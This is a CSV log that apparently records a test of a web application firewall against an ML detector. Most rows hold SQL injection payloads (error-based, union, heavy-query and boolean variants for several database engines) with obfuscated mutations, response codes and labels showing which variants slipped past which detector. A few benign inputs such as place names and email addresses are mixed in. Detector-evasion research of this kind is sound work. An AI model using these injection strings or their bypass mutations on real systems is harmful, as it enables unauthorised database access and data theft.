29,2024-12-16T18:40:13.475466,1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'opyp'  =  'opyp,403,403,200,waf_correct_ml_incorrect,1'   )    )    and 3754/**/ =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )	 ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  0x4bc= OR 0   )    )     )   from dual  )   and    (    (   'opyp'  =  'opyp,2024-12-16T18:40:34.287439,403,200,waf_correct_ml_incorrect,1'   )    )    and 3754/*BiY[*/ =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 3224!=3225 end  )   from dual  )  ||chr  (  (SELECT 1)  )  ||chr  (  122  )  ||chr  (  (SELECT 118)  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  0x4bc= OR 0   )    )     )   from dual  )   and   /**/(    (   'opyp'  =  'opyp,2024-12-16T18:40:56.502853,403,200,waf_correct_ml_incorrect,"1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (   OR 0x0  )  ||chr  (  537 IN (536,537,538)  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 3224!=3225 end  )   from dual  )  ||chr  (  (SELECT 1)  )  ||chr  (  122  )  ||chr  (  (SELECT 118) 	)  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  0x4bc= OR 0   )    )     )   from dual  )   and   /**/(    (   'opyp'  =  'opyp",2024-12-16T18:41:20.276911,403,200,waf_correct_ml_incorrect,"1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (   OR 0x0  )  ||chr  (  537 IN (536,0x219,538)  )  ||  (  select   (  case when   (  3754  =  3754  )   then 5016 IN (5015,5016,5017) else (SELECT 1)!=3225 end  )   from dual  )  ||chr  (  (SELECT 1)  )  ||chr  (  122  )  ||chr  (  (SELECT 118) 
)  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  0x4bc= OR 0   )    )     )   from dual  )   and    (    (   'opyp'  =  'opyp",2024-12-16T18:41:44.890563,403,200,waf_correct_ml_incorrect,"1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  0x70  )  ||chr  (   OR 0x0  )  ||chr  (  537 IN (536,0x219, OR 0)  )  ||  (  select   (  case when   (  3754  =  3754  )   then 5016 IN (5015,5016,5017) else (SELECT 1)!=3225 end  )   from dual  )  ||chr  (  (SELECT 1)  )  ||chr  (  122  )  ||chr  (  (SELECT 118) 
)  ||chr  (  3457 NOT LIKE 3458  )  ||chr  (  113/**/ )  ||chr  (  0x4bc= OR 0   )    )     )   from dual  )   and    (  	 (   'opyp'  =  'opyp",2024-12-16T18:42:10.639424,403,200,waf_correct_ml_incorrect
30,2024-12-16T18:42:37.293133,"-7806""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""vlrj"" like ""vlrj",403,403,200,waf_correct_ml_incorrect,"-7806"" /*Fa""*/ )    )    or   (   OR 0  =  (SELECT 1074) IN (1073,1074,1075)  )  *4906 and    (    ( 	 ""vlrj"" like ""vlrj",2024-12-16T18:42:41.327056,403,403,both_correct,"-7806""   )    )    Or   (   oR 9355=9355  =  (seLECt (SELECT 1074)) in (1073,1074,1075)  )  * AND 1 AnD    (    ( 
 ""vlrj"" lIkE ""vlrj",2024-12-16T18:42:48.036986,403,403,both_correct,"-7806""   )    ) 
  Or  /**/(   oR 9355=9355  =  (seLECt (SELECT 1074)) in (1073,(SELECT 1)!=3040,(SELECT 1075))  )  * AND 1 AnD    (    ( 
 ""vlrj"" lIkE ""vlrj",2024-12-16T18:42:55.592232,403,403,both_correct,"-7806""   )    )/**/   Or  /* kv*/(   oR 9355=9355  =  (seLECt (SELECT 1074)) in ( AND 1,(SELECT 1)!='@'<>'@k',(SELECT (SELECT 1075)))  )  * AND 1 AnD    (    ( 
 ""vlrj"" lIkE ""vlrj",2024-12-16T18:43:03.997932,403,403,both_correct,"- AND 1""   )    )/*@|*/   Or  /* kv*/(   oR 0x248b=9355  =  (seLECt (SELECT 1074)) in ( AND 6505 IN (6504,6505,6506),(SELECT 1)!='@'<>'@k',(SELECT (SELECT 1075)))  )  * AND 1 AnD    (    (   ""vlrj"" lIkE/**/""vlrj",2024-12-16T18:43:13.419024,403,403,both_correct
31,2024-12-16T18:43:24.560177,"1""   )    )    as exzo where 7518  =  7518   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",403,403,200,waf_correct_ml_incorrect,"0x1""   ) /**/  )    AS exzo WHeRE 7518  =  7518   (  sEleCt   (  caSE WHEN   (  4587  = 
4587  )   tHen regexp_substring  (  repeat  (  lEfT  (  crypt_key  (  char  (  65  )  ||char  (  (SELECT 1)  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   ElSE char  (  76  )  ||char  (  807=807  )  ||char  (  102  )   or char  (  72  )   End  )   fRoM   (  values  (  0   )    )     )  --",2024-12-16T18:43:42.345413,403,200,waf_correct_ml_incorrect,"0x1""   ) /**/  )    aS exzo WHEre 7518   lIKe   7518   (  selEcT   (  Case wHen   (  4587  =  4587  )   ThEN regexp_substring  (  repeat  (  LEft  (  crypt_key  (  char  (  0x41  )  ||char  (  (SELecT 1)  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  ) /**/ Else char  (  76  )  ||char  (  807='DzvA' LiKe 'DzvA'  )  ||char  (  102  )   OR char  (   OR 0  )   end  )   fROm   (  values  (  0   )    )     )  --",2024-12-16T18:44:01.922781,403,200,waf_correct_ml_incorrect,"0x1""   ) /**/  )    as exzo wHEre 7518   lIkE   7518   (  sELEcT   ( /**/caSe wHeN   (  4587  =  4587  )   THeN regexp_substring  (  repeat  (  lEft  (  crypt_key  (  char  (  0x41  )  ||char  (  (seLECt 1)  )   Or char  (  0x53  )  ,null  )  ,0  )  ,500000000  ) 
,null  ) /*	ZF*/ eLSE char  (  76  )  ||char  (  807='DzvA' LIkE 'DzvA'  )  ||char  (  102  )   OR char  (   OR  or 7542!=7543  )   End  )   fRom   (  values  (  0   )    )     )  --",2024-12-16T18:44:22.683577,403,200,waf_correct_ml_incorrect,"0x1""   ) /**/  )    AS exzo wHeRe (SELect 7518)   likE   7518   (  SeLeCt   (  casE WHen   (  4587  =  4587  )   then regexp_substring  (  repeat  (  lEft  (  crypt_key  (  char  (  0x41  )  ||char  (  (SElECT 1)  )   oR char  (  0x53  )  ,null  )  ,0  )  , AnD 1  ) 	,null  ) /**/ eLSe char  (  76  )  ||char  (  807='DzvA' liKE 'DzvA'  )   OR char  (  102  )   or char  (   OR  oR '4Od'='4Od'!=7543  )   end  )   fROM   (  values  (  0   )    )     )  --",2024-12-16T18:44:44.725579,403,200,waf_correct_ml_incorrect,"0x1""   ) /**/  )    aS exzo whERe (SeLEcT 7518)   LIKe    OR 0   (  sElECt   (  case wHEn   (  4587  =  4587  )   tHEn regexp_substring  (  repeat  (  LEFT  (  crypt_key  (  char  (  0x41  )  ||char  (  (sELEcT 1)  )   Or char  (  0x53  )  ,null  )  ,0  )  , aNd 1  ) 	,null  )   elSe char  (  76  )  ||char  (  3821 In (3820,3821,3822)='DzvA' LIkE 'DzvA'  )   or char  (  0x66  )   or char  (   OR  OR '4Od' like '4Od'!=7543  )   EnD  )   FROm   (  values  (  0   )    ) 
   )  --",2024-12-16T18:45:07.207602,403,200,waf_correct_ml_incorrect
32,2024-12-16T18:45:30.853149,focas@programaciones.com.sz,200,200,200,both_correct,focas@programaciones.com.sz,2024-12-16T18:45:32.223346,200,200,both_correct,focas@programaciones.com.sz,2024-12-16T18:45:34.626632,200,200,both_correct,focas@programaciones.com.sz,2024-12-16T18:45:36.993547,200,200,both_correct,focas@programaciones.com.sz,2024-12-16T18:45:39.522955,200,200,both_correct,focas@programaciones.com.sz,2024-12-16T18:45:41.989977,200,200,both_correct
33,2024-12-16T18:45:44.356071,"select * from generate_series  (  9167,9167,case when   (  9167  =  2273  )   then 1 else 0 end  )   limit 1--",403,200,403,waf_incorrect_ml_correct,"sELecT * From generate_series  (  9167,9167,CASE when	  (  (SeLeCT 9167)   Like   2273  )   tHeN '>_s'<>'>_sF' ELSE/**/ ANd 1 eND  )   limit 1--",2024-12-16T18:45:49.596761,200,403,waf_incorrect_ml_correct,"SeLeCt * FROM generate_series  (  9167,9167,caSe	whEN	  (  (seLecT  AND 1)   LIke   2273  )   THen '>_s' not like '>_sF' elSE  AnD 0x1 eND  )   limit 1720!=1721--",2024-12-16T18:45:57.418321,200,403,waf_incorrect_ml_correct,"Select * FRom generate_series  ( /**/9167,9167,CAsE whEn	  (  (seLeCT  AND 'et2' NOT LIKE 'et2|')   LIKe    && 1  )   thEN '>_s' not like '>_sF' ElsE  AnD 0x1 ENd  )   limit (SELECT 1720)!=1721--",2024-12-16T18:46:06.030012,200,403,waf_incorrect_ml_correct,"SelECT * fROm generate_series  (
 0x23cf,9167,CASE whEn	  (  (SeLecT  AND 'et2' not like 'et2|')   liKE    && 9362<>9363  )   thEN '>_s' not like '>_sF' eLSe  AND 0x1 eND  )   limit (SElecT (Select 1))!=1721--",2024-12-16T18:46:16.474863,200,403,waf_incorrect_ml_correct,"seLeCt * FROm generate_series  (
 0x23cf, anD 1,CaSe wHeN	  (  (sElECt  ANd 'et2' not like 'et2|')   likE    && 0x2492!=9363  )   Then '>_s' not like '>_sF' eLse  and 0x1 End/**/ ) 	 limit (SElECt (SeLecT 1))!='B='<>'B=8'--",2024-12-16T18:46:27.242240,200,200,both_incorrect
34,2024-12-16T18:46:38.965932,antih sacido,200,200,200,both_correct,"antih/*L{*x*/sacido",2024-12-16T18:46:39.655897,200,200,both_correct,"antih/*L{*x*/sacido",2024-12-16T18:46:41.649471,200,200,both_correct,"antih/*L{*x*/sacido",2024-12-16T18:46:43.681552,200,200,both_correct,"antih/*L{*x*/sacido",2024-12-16T18:46:45.726473,200,200,both_correct,"antih/*L{*x*/sacido",2024-12-16T18:46:47.777130,200,200,both_correct
35,2024-12-16T18:46:49.842254,"1,  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )   ",403,403,403,both_correct,"1,  (  SElECT   (  cAse WHEn   (  3717  = 
3717  )   THen 0x1 ELse  OR 0*  (  sELEcT 'dI' liKE 'dI' FRom master..sysdatabases /**/)   eNd   )    )   ",2024-12-16T18:46:55.992871,403,200,waf_correct_ml_incorrect,"1,  (  SElect   (  caSe when   (  3717  = 	 and 2425 LIKE 2425  )   thEN 0x1/**/eLse  or 0x0*  (  SElEcT 'dI' lIKE 'dI' fRom master..sysdatabases /*+g}H[*/)   END   )    )   ",2024-12-16T18:47:04.072296,403,200,waf_correct_ml_incorrect,"(SeLECt 1),  (  SELECt   (  CaSE WHEn   (  '4)_i%'<>'4)_i%#'   lIKe    anD 2425 lIKE 0x979  )   ThEN 0x1/*wI[*/ElSE  oR 0x0*  (  sELEct 'dI' LIke 'dI' frOM master..sysdatabases  )   END   )    )   ",2024-12-16T18:47:13.142485,403,200,waf_correct_ml_incorrect,"(SelEct (SelecT 1)),/**/ (  sEleCt   (  caSe WhEn   (  ' AND 1)_i%' not like ''[h'='[h')_i%#'   lIKE    AnD 2425 LiKe 0x979  )   thEN 0x1/*t	*/elSE  Or 0x0*  (  SelECT 'dI' likE 'dI' FROm master..sysdatabases  )   eNd   )    )   ",2024-12-16T18:47:23.315953,403,200,waf_correct_ml_incorrect,"(sElEcT
(selecT 1)),/**/ (  SeLECT   (  cASE wHen/**/  (  ' AND (SELECT 0x1))_i%' not like ''[h'='[h')_i%#'   liKE    anD 892 not like 893 liKe 0x979  )   Then 0x1/**/eLsE  oR 0x0*  (  select 'dI' LiKE 'dI' fRom master..sysdatabases  )   ENd   )    )   4S",2024-12-16T18:47:35.183560,403,200,waf_correct_ml_incorrect
36,2024-12-16T18:47:48.024608,undus de lerda,200,200,200,both_correct,"undus/**/de
lerda",2024-12-16T18:47:48.805456,200,200,both_correct,undus de	lerda,2024-12-16T18:47:50.693557,200,200,both_correct,"undus/*~/a{p*/de
lerda",2024-12-16T18:47:52.489681,200,200,both_correct,undus/*~/a{p*/de	lerda,2024-12-16T18:47:54.823571,200,200,both_correct,"undus/*~/a{p*/de
lerda",2024-12-16T18:47:57.046259,200,200,both_correct
37,2024-12-16T18:47:59.243047,mayworth@sms24h.tr,200,200,200,both_correct,mayworth@sms24h.tr,2024-12-16T18:48:00.245350,200,200,both_correct,mayworth@sms24h.tr,2024-12-16T18:48:02.208278,200,200,both_correct,mayworth@sms24h.tr,2024-12-16T18:48:04.220907,200,200,both_correct,mayworth@sms24h.tr,2024-12-16T18:48:06.191904,200,200,both_correct,mayworth@sms24h.tr,2024-12-16T18:48:08.174400,200,200,both_correct
38,2024-12-16T18:48:10.126793,"1""  )   as xylo where 2112  =  2112 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",403,403,200,waf_correct_ml_incorrect,"1""  )   As xylo WheRE 2112   lIKe   (SelEct 1) AND 3715 IN    (    (   char  (  113  )  +char  (/**/ 113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  SelecT   (  caSE WheN   (  3715  =  3715  )   THEn char  (  0x9b1 NOT LIKE 2482  )   elSE char  (  48  )   eND   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )
    )  --",2024-12-16T18:48:27.349812,403,200,waf_correct_ml_incorrect,"1""  )   aS xylo wHErE 2112   liKE   (seLeCt 1) AnD 3715 In    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  389 NOT LIKE 390  )  +char  (  113  )  +  (  SELECt
  (  Case when   (  3715   like   (SELECT 3715)  )   ThEn char  (  0x9b1 NOT LIKE  AND 1  )   ELse char  (  48  )   eND   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )
    )  --",2024-12-16T18:48:46.874296,403,200,waf_correct_ml_incorrect,"1""  )   as xylo WHERE 2112   lIke   (sELECT 1) ANd 2914<>2915 IN    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  0x185 NOT LIKE 390  )  +char  (  (SelEct 1)  )  +  (  SElect
  (  CAsE WhEn   (  3715   LIkE   (seLeCt 3715)  )   tHEN char  (/**/ 0x9b1 NOT LIKE  And 1  )   ELSE char  (  48  )   End   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",2024-12-16T18:49:07.841231,403,200,waf_correct_ml_incorrect,"1""  )   as xylo wHEre 2112   LIKE   (sEleCT 1) ANd 2914<>2915 IN    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  0x185 NOT LIKE 390  )  +char  (  (SELecT 1)  )  +  (  SeLECT
  (  CaSe WheN   (  3715   LIKE   (sElecT 3715)  )   then char  (  0x9b1 not like  ANd 1  )   ElSE char  (	 48  )   END   )    )   +char  (  0x1930=6448  )  +char  (  122  )  +char  (   Or 0  )  +char  (  122  )  +char  (  113   )    )     )  --",2024-12-16T18:49:29.763565,403,200,waf_correct_ml_incorrect,"1""  )   aS xylo wHere 2112   LIkE   (selEct  anD 1) AND 2914<>2915 in    (    (   char  (  113  )  +char  (  113/**/ )	 +char  (  112  )  +char  (  0x185 not like 390  )  +char  (  (SeLeCT 1)  )  +  (  sELeCT
  (  CasE WheN   (  3715   LIKe   (sELect 3715)  )   then char  (  0x9b1 not like  ANd 1  )   ELsE char  (	 0x30  )   enD   )    )   +char  (  0x1930=6448  )  +char  (  122  )  +char  (   OR 0  )  +char  (  122  )  +char  (  9487 LIKe 9487   )    )     )  --",2024-12-16T18:49:51.806116,403,200,waf_correct_ml_incorrect
39,2024-12-16T18:50:14.743146,"1""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""rwlq""  =  ""rwlq",403,403,403,both_correct,"1""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat /**/(  0x7171706a71,  (  select   (  elt  (  9173  =  (SELECT 1),0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *8550 NOT LIKE 8551   )    )   x from information_schema.character_sets group by x 
)  a  )   and   (  ""rwlq""  =  ""rwlq",2024-12-16T18:50:28.255525,403,403,both_correct,"1""  )   or   (  select  OR 0 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  (SELECT 0x1),0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *8550 NOT LIKE 9385=9385   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""rwlq""  =  ""rwlq",2024-12-16T18:50:43.691249,403,403,both_correct,"(SELECT 1)""  )   or   (  select  OR 0 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  (SELECT 0x1),0x1   )  /*Pmr}g*/ )     )  ,0x717a767a71,floor  (  rand  (  'MR'!='MR^'  )  *(SELECT 8550) NOT LIKE 9385=9385   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""rwlq"" 
=  ""rwlq",2024-12-16T18:50:59.618618,403,403,both_correct,"(sELeCt  AnD 1)""  )   or   (  select  OR 103 NOT LIKE (SELECT 104) from  (  select count  (  *  )  ,concat /**/(  0x7171706a71,  (  select   (  elt  (  9173  =  (SELECT 0x1),0x1   )  /*V""*/ )     )  ,0x717a767a71,floor  (  rand  (  'MR' not like 'MR^'  )  *(sELECt 8550) NOT LIKE 9385=9385   )    )   x frOm information_schema.character_sets group by x  )  a  )   aND   (  ""rwlq""  =  ""rwlq",2024-12-16T18:51:17.245406,403,403,both_correct,"(SelECt  AND 1)""  )   or   (  select  OR 103 NOT LIKE (SELECT 104) from  (  select count  (  *  )  ,concat /*maA4*/(  0x7171706a71,  (  select   (  elt  (  0x23d5  =  (SELECT 0x1),0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  'MR' not like 'MR^'  )  *(sELECt 8550) NOT LIKE	24!=(SELECT 1)=9385   )    )   x frOm information_schema.character_sets group by x  )  a  )   aND   (  ""rwlq""  =  ""rwlq",2024-12-16T18:51:36.696948,403,403,both_correct
40,2024-12-16T18:51:56.329032,escocia 197,200,200,200,both_correct,"escocia
'P3B' not like/**/'P3BI'",2024-12-16T18:51:56.967588,200,200,both_correct,"escocia
'P3B'/**/not	like/*(;Kq-*/'P3BI'",2024-12-16T18:51:59.575049,200,200,both_correct,escocia 'P3B' not	like/*(;Kq-*/'P3BI',2024-12-16T18:52:02.868788,200,200,both_correct,"escocia
'P3B'/**/not	like/*(;Kq-*/'P3BI'",2024-12-16T18:52:05.806802,200,200,both_correct,"escocia
'P3B'
not	like/*(;Kq-*/'P3BI'",2024-12-16T18:52:08.765013,200,200,both_correct
41,2024-12-16T18:52:11.563231,1   )    )    as xmac where 7692  =  7692,403,403,200,waf_correct_ml_incorrect,'L'!='LY'  /**/)    )    As xmac wHerE 0x1e0c   liKE   	oR 0,2024-12-16T18:52:13.567024,403,200,waf_correct_ml_incorrect,"'L' not like 'LY'  /*|*/)    )    as xmac whEre 0x1e0c /**/ LIKE   
OR (SELECT  AND 1) LIKE 5058",2024-12-16T18:52:17.440194,403,403,both_correct,"'L' not like 'LY'  /*|*/)    )    AS xmac where 0x1e0c	/**/ Like/**/  
oR (seLEcT  anD  OR 3550!=3551) liKe 0x13c2",2024-12-16T18:52:23.073538,403,200,waf_correct_ml_incorrect,"'L' not like 'LY'  /*|*/)/**/   )    aS xmac wherE 0x1e0c /**/ lIke/**/  
oR (SelEct  ANd  or (SELECT 'Tt'='Tt') not like  AND 1) LIke 0x13c2",2024-12-16T18:52:29.497128,403,403,both_correct,"'L' not like 'LY'  /*|*/)/**/   )   
As xmac WHerE 0x1e0c   LIkE/**/  
Or (SEleCT  AnD  oR (SElEcT 'Tt'='Tt') not like  &&  and 'by'='by') likE 0x13c2",2024-12-16T18:52:37.367865,403,200,waf_correct_ml_incorrect
42,2024-12-16T18:52:45.274904,lue39,200,200,200,both_correct,lue39,2024-12-16T18:52:45.644406,200,200,both_correct,lue39,2024-12-16T18:52:47.000998,200,200,both_correct,lue39,2024-12-16T18:52:48.377923,200,200,both_correct,lue39,2024-12-16T18:52:49.745312,200,200,both_correct,lue39,2024-12-16T18:52:51.128412,200,200,both_correct
43,2024-12-16T18:52:52.493352,"1   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",403,403,200,waf_correct_ml_incorrect,"0x1   )    )    	)   aNd  oR 'c' NOT LIKE 'ct'   like     (  SelECT count /**/(  *  )   FROM domain.domains AS t1,domain.columns aS t2,domain.tables aS t3  )  --",2024-12-16T18:52:58.807851,200,200,both_incorrect,"0x1   )    )    	)   aNd  Or 'c' not like 'ct'	  liKE     (  seLECt count  (  *  )   frOM domain.domains as t1,domain.columns As t2,domain.tables as t3  )  --",2024-12-16T18:53:07.712086,200,200,both_incorrect,"0x1   )    )    	)  /**/ANd  Or 'c' not like 'ct'	  liKE    	(  sElECt count  (  *  )   fRom domain.domains as t1,domain.columns As t2,domain.tables AS t3  )  --",2024-12-16T18:53:16.186800,200,200,both_incorrect,"0x1   )    )    	)  /**/and  Or 'c' not like 'ct'
  lIKE    	(  sELEct count/*\'Ue*/ (  *  )   FROm domain.domains aS t1,domain.columns as t2,domain.tables aS t3  )  --",2024-12-16T18:53:24.805162,200,200,both_incorrect,"0x1   )    )    	)  /*-o*/aND  oR 'c' not like 'ct'	  lIke    	(  SElect count/**/ (  *  )   FROm domain.domains aS t1,domain.columns AS t2,domain.tables/**/as t3  )  --",2024-12-16T18:53:34.009483,200,200,both_incorrect
44,2024-12-16T18:53:42.962724,pineda de la sierra,200,200,200,both_correct,pineda	de/*q5T*/la sierra,2024-12-16T18:53:44.028608,200,200,both_correct,pineda de/**/la/*2AJ*/sierra,2024-12-16T18:53:46.392399,200,200,both_correct,pineda	de/**/la sierra,2024-12-16T18:53:48.842238,200,200,both_correct,"pineda
de/**/la/*r*/sierra",2024-12-16T18:53:51.023978,200,200,both_correct,pineda de la/**/sierra,2024-12-16T18:53:53.325593,200,200,both_correct
45,2024-12-16T18:53:55.457479,1'  )   where 3767  =  3767 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,403,403,403,both_correct,"1'  )  
where (SELECT 3767)  =  3767 and 6240  =    (  'qqpjq'||  (  select case  OR 0 when 'C'!='CA' then 1 else 0 end from rdb$database  )  ||'qzvzq'/*ikdv*/ )  --",2024-12-16T18:54:02.409819,403,403,both_correct,"'>X'!='>XY''  )  
where (SELECT 3767)  =  3767 and (SELECT 1)  =    (  'qqpjq'||  (  select case/**/ OR (SELECT 0) when 'C'!='CA' then 1 else 0 end from rdb$database  )  ||'qzvzq'/**/ )
 --",2024-12-16T18:54:11.182638,403,403,both_correct,"'>X'<>'>XY''  )  	where (SELECT (SELECT 1))  =  3767 and (SELECT 1)  =    (  'qqpjq'||  (  select case/**/ OR (SELECT 0) when 'C'!='CA' then 'F;' NOT LIKE 'F;/' else (SELECT 0) end from rdb$database  )  ||'qzvzq'  )
 --",2024-12-16T18:54:21.098496,403,403,both_correct,"'>X' NOT LIKE '>XY''  )  
where (SELECT (SELECT 1))  =  (SELECT 1) and (SELECT 'I'<>'IO')  =    (  'qqpjq'||  (  select case  OR (SELECT 0x0) when 'C'!='CA' then 'F;' NOT LIKE 'F;/' else (SELECT 0) end from rdb$database  )  ||'qzvzq'  )
 --",2024-12-16T18:54:32.588050,403,403,both_correct,"'>X' not like '>XY''  )  	where (SELECT (SELECT (SELECT 1)))  =  (SELECT 0x1) and (SELECT 'I'<>'IO')  =    (  'qqpjq'||  (  select case  OR (SELECT 0x0) when 'C'!='CA' then 'F;' NOT LIKE 'F;/' else (SELECT '['='[') end from rdb$database  )  ||'qzvzq' /**/)
 --",2024-12-16T18:54:44.804265,403,403,both_correct
46,2024-12-16T18:54:58.282453,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",403,403,403,both_correct,"-0x2017%""  ) /**/ union	all SeLECt 3877,(SElect 1),'%' NOT LIKE '%2',3877,3877,3877--",2024-12-16T18:55:01.204243,403,403,both_correct,"-0x2017%""  ) /*8*/ union all SElECT 3877,(sELECT '^0'/**/not like '^0Z'),'%' NOT LIKE '%(SELECT 2)',3877, or 0,3877--",2024-12-16T18:55:06.288691,403,403,both_correct,"-0x2017%""  ) /*(SELECT 8)*/ union all selEct 3877,(SelEct	'^0'/**/not like '^0Z'),'%' NOT LIKE '%(SELECT/**/'/)""'<>'/)""6')',3877, Or 0,(SELECT 1)--",2024-12-16T18:55:13.059276,403,403,both_correct,"-0x2017%""  ) /*(SELECT (SELECT 8))*/ union all selEct 9206 NOT LIKE 9207,(SelEct
'^0' not like '^0Z'),'%' NOT LIKE '%(SELECT/*Rtm@=*/'/)""'<>'/)""6')',3877, Or  aNd 1,(SelecT 1)--",2024-12-16T18:55:21.053714,403,403,both_correct,"-0x2017%""  ) /*(SELECT (SELECT 8))*/ union all selEct 9206 NOT LIKE '=FFc'='=FFc',(SelEct '^0' not like '^0Z'),'%' NOT LIKE '%(SELECT/*Rtm@=*/'/)""'<>'/)""6')', And (SELECT 1), or  anD/**/1,(select 1)--",2024-12-16T18:55:30.374926,403,403,both_correct
47,2024-12-16T18:55:40.954056,"1""  )   as nixg where 4580  =  4580 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",403,403,200,waf_correct_ml_incorrect,"1""  )   aS nixg wHeRe 4580   lIke   2082!=2083 AND 4241  =  convert  (  int,  (  SeLect char  (  0x71  )  +char  (  113  )  +char  (  112  )  +char  ( /**/ Or 0  )  +char  (  113  )  +  (  seLeCt   (  CAsE WHEN   (  4241 	=  4241  )   thEN char  (  49  )   eLSe char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",2024-12-16T18:55:58.631347,403,200,waf_correct_ml_incorrect,"1""  )   aS nixg wheRE 4580   lIKE   0x822!=2083 AnD 4241  =  convert  (  int,  (  SeLect char  (  0x71  )  +char  (  113  )  +char  (  112  )  +char  (   or 0  )  +char  (  113  )  +  (  SeLEcT   (  CAse WHEn   (  4241  =  4241  )   theN char  (  49  )   eLse char  (  48  )   EnD   )    )   +char  (  113  )  +char  (  122  )  +char  (  (SELECT 1)  )  +char  (  '[$'<>'[$>'  )  +char  (  113   )    )     )  --",2024-12-16T18:56:18.503013,403,200,waf_correct_ml_incorrect,"1""  )   AS nixg WHEre 4580   LIke   0x822!=2083 anD 4241  =  convert  (  int,  (  seleCt char  (  0x71  )  +char  (  113  )  +char  (  112  )  +char  (   or 0  )  +char  (  113  )  +  (  seLECT   (  CAse WheN   (   OR 0<>5371   Like   4241  )   THEN char  (  49  )   ElSE char  (  48	 )   EnD   )    )   +char  (  113  )  +char  (  122  )  +char  (  (sElECt 1)  )  +char  (  '[$'<>'[$>'  )  +char  (  0x71/**/  )    )     )  --",2024-12-16T18:56:38.880753,403,200,waf_correct_ml_incorrect,"1""  )   aS nixg WheRE 4580   liKE   0x822 NOT LIKE 2083 anD 4241  =  convert  (  int,  (  sELEct char  (  0x71  )  +char  (  113  )  +char  (  112  )  +char  (   or 0  )	 +char  (  '_'<>'_w'  )  +  (  SeLEct   (  CAse wHeN   (   Or  AND 1<>0x14fb   likE   4241  )   ThEN char  (  49  )   else char  (  48	 )   End   )    )   +char  (  113  )  +char  (  122  )  +char  (  (SeLecT 1)  )  +char  (  '[$'<>'[$>'  )  +char  (  0x71   )    )     )  --",2024-12-16T18:57:00.029773,403,200,waf_correct_ml_incorrect,"0x1""  )   as nixg wHeRe 4580  
